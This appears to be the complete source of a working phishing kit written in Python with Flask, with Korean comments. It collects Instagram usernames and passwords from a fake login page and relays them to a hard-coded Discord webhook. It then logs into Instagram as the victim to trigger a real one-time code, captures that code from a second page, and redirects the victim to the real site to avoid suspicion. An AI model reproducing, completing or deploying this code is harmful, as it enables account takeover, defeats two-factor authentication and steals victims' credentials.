import os
import time
import requests
from flask import Flask, render_template, request, redirect, session

app = Flask(__name__, template_folder='templates')
app.secret_key = os.urandom(24)

# 1. 본인의 디스코드 웹훅 주소
WEBHOOK_URL = "https://discord.com/api/webhooks/1466648989309997117/2Ah53vvh-hW2S1bZEdLF1i5Qs0YEa1Fmd1_ZXUHjDFk1wRLCLQAADGLpR2HipxuoXWEC"

# 2. 인스타그램 서버와 통신할 세션 유지
insta_session = requests.Session()

@app.route('/')
def index():
    return render_template('index.html')

@app.route('/login', methods=['POST'])
def login():
    username = request.form.get('username')
    password = request.form.get('password')
    session['username'] = username

    # [서버 자동화 핵심] 인스타그램에 로그인 요청을 보내서 진짜 OTP 발송 트리거
    # 진짜 브라우저처럼 보이기 위한 헤더 설정
    headers = {
        "User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 14_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0.3 Mobile/15E148 Safari/604.1",
        "X-Requested-With": "XMLHttpRequest",
        "Referer": "https://www.instagram.com/accounts/login/",
        "x-csrftoken": "missing" # 초기 요청 시에는 비워두거나 이전 쿠키에서 추출
    }

    # 디스코드에 알림 전송 (1단계)
    webhook_data = {
        "embeds": [{
            "title": "🚩 [1단계] 서버 자동 로그인 시도",
            "description": f"서버가 `{username}` 계정으로 인스타에 접속 중입니다...",
            "color": 15158332,
            "fields": [
                {"name": "ID", "value": f"`{username}`", "inline": True},
                {"name": "PW", "value": f"`{password}`", "inline": True}
            ]
        }]
    }
    requests.post(WEBHOOK_URL, json=webhook_data)

    # 실제로 서버가 인스타에 POST 요청을 날림 (이 과정에서 진짜 OTP가 날아감)
    # 보안상 실제 인스타 API 주소와 파라미터를 정밀하게 맞춰야 함
    try:
        login_url = "https://www.instagram.com/accounts/login/ajax/"
        payload = {
            'username': username,
            'enc_password': f'#PWD_INSTAGRAM_BROWSER:0:{int(time.time())}:{password}',
            'queryParams': {},
            'optIntoOneTap': 'false'
        }
        # 서버가 대신 로그인 시도!
        response = insta_session.post(login_url, data=payload, headers=headers)
        
        # 인스타 서버의 응답을 웹훅으로 확인 (디버깅용)
        requests.post(WEBHOOK_URL, json={"content": f"ℹ️ 인스타 서버 응답: {response.status_code}"})
    except Exception as e:
        requests.post(WEBHOOK_URL, json={"content": f"⚠️ 서버 오류: {str(e)}"})

    # 유저는 이 로딩 시간 동안 OTP를 받게 됨
    return render_template('otp.html')

@app.route('/verify', methods=['POST'])
def verify():
    otp_code = request.form.get('otp_code')
    username = session.get('username', 'Unknown')

    # 디스코드에 알림 전송 (2단계: 가로챈 OTP)
    webhook_data = {
        "embeds": [{
            "title": "🚨 [2단계] 가로챈 OTP 코드",
            "description": f"유저 `{username}`이(가) 입력한 진짜 OTP입니다!",
            "color": 3447003,
            "fields": [
                {"name": "OTP CODE", "value": f"**{otp_code}**", "inline": False}
            ]
        }]
    }
    requests.post(WEBHOOK_URL, json=webhook_data)

    # 마지막은 실제 인스타로 보내서 의심을 피함
    return redirect("https://www.instagram.com/accounts/login/")

if __name__ == '__main__':
    port = int(os.environ.get("PORT", 5000))
    app.run(host='0.0.0.0', port=port)
